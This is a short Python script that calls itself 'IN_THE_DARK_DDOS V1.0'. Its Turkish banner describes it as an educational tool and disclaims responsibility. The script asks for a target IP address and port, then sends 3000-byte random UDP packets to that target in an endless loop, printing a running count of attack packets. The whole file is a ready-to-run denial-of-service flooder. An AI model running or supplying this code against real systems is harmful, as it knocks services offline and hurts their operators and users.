import socket
import random
import os

os.system("clear")
banner="""
    ##############################################################
    # IN_THE_DARK_DDOS V1.0                                      #
    # Code by THE_DARK                                           #
    # Bu tool egitim amaclidir sorumluluk kabul etmiyorum        #
    ##############################################################

"""
print(banner)

hedef_ip=raw_input("Hedef ip: ")
hedef_port=input("Hedef port: ")

bytes=random._urandom(3000)
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

sayac=0
while True:
        sock.sendto(bytes,(hedef_ip,hedef_port))
        sayac=sayac+1
        print("Saldiri baslatildi,gonderilen paket:%s"%(sayac))
